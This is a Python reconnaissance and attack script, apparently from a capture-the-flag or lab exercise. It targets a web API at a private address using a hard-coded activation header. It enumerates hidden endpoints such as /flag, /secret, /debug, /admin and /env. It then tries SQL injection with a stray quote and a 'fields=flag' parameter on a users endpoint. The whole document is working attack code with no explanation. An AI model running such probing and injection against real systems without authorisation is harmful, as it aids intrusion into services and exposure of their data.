#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:54088"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}

print(f"=== Exploring {BASE_URL} ===")


def get(path):
    try:
        resp = requests.get(f"{BASE_URL}{path}", headers=HEADERS, timeout=2)
        print(f"GET {path} -> {resp.status_code}")
        if resp.status_code == 200:
            print(resp.text[:500])
        return resp
    except Exception as e:
        print(f"Error {path}: {e}")


# 1. Root
get("/")

# 2. Standard Endpoints
get("/api/v1/users?user_type=students")
get("/api/v1/statistics")
get("/api/v1/subjects")

# 3. Hidden/Debug Endpoints
candidates = [
    "/flag",
    "/api/v1/flag",
    "/secret",
    "/api/v1/secret",
    "/debug",
    "/api/v1/debug",
    "/console",
    "/admin",
    "/config",
    "/env",
    "/api/v1/config",
]

for c in candidates:
    get(c)

# 4. Check if we can exploit users endpoint here differently
print("\n=== Checking Injection on 54088 ===")
try:
    # Try SQLi on user_type
    resp = requests.get(
        f"{BASE_URL}/api/v1/users", params={"user_type": "students'"}, headers=HEADERS
    )
    print(f"Injection ' -> {resp.status_code}")

    # Try fields injection
    resp = requests.get(
        f"{BASE_URL}/api/v1/users",
        params={"user_type": "students", "fields": "flag"},
        headers=HEADERS,
    )
    print(f"Field 'flag' -> {resp.text}")
except:
    pass
